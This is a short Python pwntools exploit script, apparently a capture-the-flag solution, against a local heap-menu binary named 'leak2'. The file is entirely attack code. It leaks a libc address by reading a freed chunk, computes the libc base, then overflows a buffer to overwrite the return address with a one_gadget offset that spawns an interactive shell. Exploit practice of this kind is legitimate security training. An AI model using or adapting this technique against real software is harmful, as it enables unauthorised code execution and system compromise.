from pwn import *

p = process("./leak2")
e = ELF("./leak2")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def malloc(data):
    p.sendlineafter(b"> ", b"1")
    p.sendafter(b"Data: ", data)

def free(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"idx: ", str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.sendafter(b"data: ", data)

def print_data(idx):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.recvuntil(b"data: ")
    return p.recvline()[:-1]

def exit(data):
    p.sendlineafter(b"> ", b"5")
    p.send(data)

malloc(b"AAAA")
malloc(b"AAAA")
free(0)
main_arena = u64(print_data(0)+b"\x00\x00")
libc_base = main_arena - 0x3c4b20 - 0x58
print(hex(libc_base))
og = libc_base + 0xf1247 # 4527a f03a4 f1247
pause()
exit(b"A"*272 + b"B"*8 + p64(og))
p.interactive()